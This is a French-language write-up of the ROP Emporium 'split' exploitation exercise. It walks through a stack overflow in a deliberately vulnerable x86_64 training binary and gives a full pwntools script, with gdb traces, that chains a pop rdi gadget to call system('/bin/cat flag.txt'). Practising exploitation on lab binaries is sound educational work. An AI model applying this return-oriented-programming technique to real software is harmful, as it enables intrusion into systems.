---
Title: Ropemporium x86_64 split
Date: 2023-06-02
Tags: [linux, python, ROP, x86_64, ropemporium]
Categories: [write-up]
Author: cdpointpoint
---

# Introduction

Dans ce second exercice on doit passer un argument à la fonction appelée.
L'argument est présent dans le programme.

# Découverte

## Exécution

``` sh
$ ./split
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> AAAAAAA
Thank you!

Exiting
```

## Exploration du code

``` sh
La fonction main :

gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:	push   rbp
   0x0000000000400698 <+1>:	mov    rbp,rsp
   0x000000000040069b <+4>:	mov    rax,QWORD PTR [rip+0x2009d6]        # 0x601078 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:	mov    ecx,0x0
   0x00000000004006a7 <+16>:	mov    edx,0x2
   0x00000000004006ac <+21>:	mov    esi,0x0
   0x00000000004006b1 <+26>:	mov    rdi,rax
   0x00000000004006b4 <+29>:	call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:	mov    edi,0x4007e8
   0x00000000004006be <+39>:	call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:	mov    edi,0x4007fe
   0x00000000004006c8 <+49>:	call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:	mov    eax,0x0
   0x00000000004006d2 <+59>:	call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:	mov    edi,0x400806
   0x00000000004006dc <+69>:	call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:	mov    eax,0x0
   0x00000000004006e6 <+79>:	pop    rbp
   0x00000000004006e7 <+80>:	ret
End of assembler dump.
```

la fonction pwnme :

```sh
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400810
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x40083c
   0x0000000000400715 <+45>:	mov    eax,0x0
   0x000000000040071a <+50>:	call   0x400570 <printf@plt>
   0x000000000040071f <+55>:	lea    rax,[rbp-0x20]
   0x0000000000400723 <+59>:	mov    edx,0x60
   0x0000000000400728 <+64>:	mov    rsi,rax
   0x000000000040072b <+67>:	mov    edi,0x0
   0x0000000000400730 <+72>:	call   0x400590 <read@plt> ; read(0, rbp-0x20, 0x60)
   0x0000000000400735 <+77>:	mov    edi,0x40083f
   0x000000000040073a <+82>:	call   0x400550 <puts@plt>
   0x000000000040073f <+87>:	nop
   0x0000000000400740 <+88>:	leave
   0x0000000000400741 <+89>:	ret
End of assembler dump.
```

On a de nouveau un débordement avec une offset 0x28 avant écrasement de SRIP.

Les fonctions disponibles :

Avec gdb.

``` sh
gef➤  i fun
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400742  usefulFunction
0x0000000000400760  __libc_csu_init
0x00000000004007d0  __libc_csu_fini
0x00000000004007d4  _fini
```

Avec le command readelf :

``` sh
02_split# readelf -s split|grep FUNC|grep -v UND
    27: 00000000004005f0     0 FUNC    LOCAL  DEFAULT   13 deregister_tm_clones
    28: 0000000000400620     0 FUNC    LOCAL  DEFAULT   13 register_tm_clones
    29: 0000000000400660     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    32: 0000000000400690     0 FUNC    LOCAL  DEFAULT   13 frame_dummy
    35: 00000000004006e8    90 FUNC    LOCAL  DEFAULT   13 pwnme
    36: 0000000000400742    17 FUNC    LOCAL  DEFAULT   13 usefulFunction
    45: 00000000004007d0     2 FUNC    GLOBAL DEFAULT   13 __libc_csu_fini
    50: 00000000004007d4     0 FUNC    GLOBAL DEFAULT   14 _fini
    61: 0000000000400760   101 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    63: 00000000004005e0     2 FUNC    GLOBAL HIDDEN    13 _dl_relocate_sta[...]
    64: 00000000004005b0    43 FUNC    GLOBAL DEFAULT   13 _start
    66: 0000000000400697    81 FUNC    GLOBAL DEFAULT   13 main
    69: 0000000000400528     0 FUNC    GLOBAL DEFAULT   11 _init
```


On dispose d'une fonction qui exécute une commande passée en paramètre :

    gef➤  disas usefulFunction
    Dump of assembler code for function usefulFunction:
    0x0000000000400742 <+0>:	push   rbp
    0x0000000000400743 <+1>:	mov    rbp,rsp
    0x0000000000400746 <+4>:	mov    edi,0x40084a         ; /bin/ls
    0x000000000040074b <+9>:	call   0x400560 <system@plt>
    0x0000000000400750 <+14>:	nop
    0x0000000000400751 <+15>:	pop    rbp
    0x0000000000400752 <+16>:	ret
    End of assembler dump.


Pour cet exercice, une chaîne de caractères est présente dans l'exécutable

gef➤  x/s &usefulString
0x601060 <usefulString>:	"/bin/cat flag.txt"

On peut donc envisager d'appeler l'adresse 0x000000000040074b (usefulFunction +7)
en ayant préalablement chargé l'adresse de usefulString dans le registre rdi.

## Construction de la ropchaine

### Recherche d'un gadget pour charger rdi.

```sh
02_split# ROPgadget --binary split --re "pop rdi"
Gadgets information
============================================================
0x00000000004007c3 : pop rdi ; ret

Unique gadgets found: 1
```

### Ropchaine

La chaîne à envoyer après les 40 octets de débordement :

| gadget   | comment |
|----------|---------|
| 0x04007c3| pop rdi; ret |
| 0x601060 | @usefulString
| 0x40074b | call system dans usefulFunction

### Python script

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time


gs='''
b *pwnme+89
c
'''

#context(terminal=['tmux', 'split-window', '-h'])
# Set up pwntools for the correct architecture
elf =  ELF('split')
context.binary=elf
# context(terminal=['tmux'])

useful_str=elf.symbols["usefulString"]
useful_fun=elf.symbols["usefulFunction"]

# Offset avant ecrasement de l'adresse de retour
offset=0x28
# gadget pop rdi; ret
pop_rdi=0x04007c3

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

print(f"{useful_str=:x}")
print(f"{useful_fun=:x}")

io.recvuntil(b"> ")

# On retour en useful_fun + 9  pour sauter l'affectation de edi dans la fonction
PL =b"A"*offset
PL+=p64(pop_rdi)
PL+=p64(useful_str)
PL+=p64(useful_fun+9)

io.sendline(PL)
io.interactive()
```

## Exécution sous gdb/gef

Lancement de notre script en mode debug

```sh
python3 solve.py -d
```

On se retrouve dans gdb sur un point d'arrêt au retour de la fonction pwnme :

```sh
─────────────────────────────────────────────────────────────── stack ────
0x007ffe02e59108│+0x0000: 0x000000004007c3  →   pop rdi	 ← $rsp
0x007ffe02e59110│+0x0008: 0x00000000601060  →  "/bin/cat flag.txt"
0x007ffe02e59118│+0x0010: 0x0000000040074b  →  <usefulFunction+9> call 0x400560 <system@plt>
0x007ffe02e59120│+0x0018: 0x007ffe02e5920a  →  0x000000007ffe02e5
0x007ffe02e59128│+0x0020: 0x0000000100000000
0x007ffe02e59130│+0x0028: 0x00000000400697  →  <main+0> push rbp
0x007ffe02e59138│+0x0030: 0x007f4a33f3c7cf  →  <init_cacheinfo+287> mov rbp, rax
0x007ffe02e59140│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────── code:x86:64 ────
     0x40073a <pwnme+82>       call   0x400550 <puts@plt>
     0x40073f <pwnme+87>       nop
     0x400740 <pwnme+88>       leave
 →   0x400741 <pwnme+89>       ret
   ↳    0x4007c3 <__libc_csu_init+99> pop    rdi
        0x4007c4 <__libc_csu_init+100> ret
```
On avance  d'une instuction : ret => rip est chargé avec l'adresse contenue sur la pile.

```sh
─────────────────────────────────────────────────────────────── stack ────
0x007ffe02e59110│+0x0000: 0x00000000601060  →  "/bin/cat flag.txt"	 ← $rsp
0x007ffe02e59118│+0x0008: 0x0000000040074b  →  <usefulFunction+9> call 0x400560 <system@plt>
0x007ffe02e59120│+0x0010: 0x007ffe02e5920a  →  0x000000007ffe02e5
0x007ffe02e59128│+0x0018: 0x0000000100000000
0x007ffe02e59130│+0x0020: 0x00000000400697  →  <main+0> push rbp
0x007ffe02e59138│+0x0028: 0x007f4a33f3c7cf  →  <init_cacheinfo+287> mov rbp, rax
0x007ffe02e59140│+0x0030: 0x0000000000000000
0x007ffe02e59148│+0x0038: 0x47cc91bf079b7339
────────────────────────────────────────────────────────────── code:x86:64 ────
 →   0x4007c3 <__libc_csu_init+99> pop    rdi
     0x4007c4 <__libc_csu_init+100> ret
```

ni : "pop edi" charge dans edi le contenu de la pile.

```sh
─────────────────────────────────────────────────────────────────── stack ────
0x007ffe02e59118│+0x0000: 0x0000000040074b  →  <usefulFunction+9> call 0x400560 <system@plt>	 ← $rsp
0x007ffe02e59120│+0x0008: 0x007ffe02e5920a  →  0x000000007ffe02e5
0x007ffe02e59128│+0x0010: 0x0000000100000000
0x007ffe02e59130│+0x0018: 0x00000000400697  →  <main+0> push rbp
0x007ffe02e59138│+0x0020: 0x007f4a33f3c7cf  →  <init_cacheinfo+287> mov rbp, rax
0x007ffe02e59140│+0x0028: 0x0000000000000000
0x007ffe02e59148│+0x0030: 0x47cc91bf079b7339
0x007ffe02e59150│+0x0038: 0x000000004005b0  →  <_start+0> xor ebp, ebp
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007be <__libc_csu_init+94> pop    r13
     0x4007c0 <__libc_csu_init+96> pop    r14
     0x4007c2 <__libc_csu_init+98> pop    r15
 →   0x4007c4 <__libc_csu_init+100> ret
   ↳    0x40074b <usefulFunction+9> call   0x400560 <system@plt>
```
ni : ret ,  rip est chargé avec l'adresse sur la pile 0x40074b contenant un "call system"

On a alors :

```sh
system@plt (
   $rdi = 0x00000000601060 → "/bin/cat flag.txt"
)
```

### Execution directe

```sh
02_split$ python solve.py
[*] '/home/jce/w/ropemporium/x64/02_split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/jce/w/ropemporium/x64/02_split/split': pid 5404
useful_str=601060
useful_fun=400742
[*] Switching to interactive mode
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

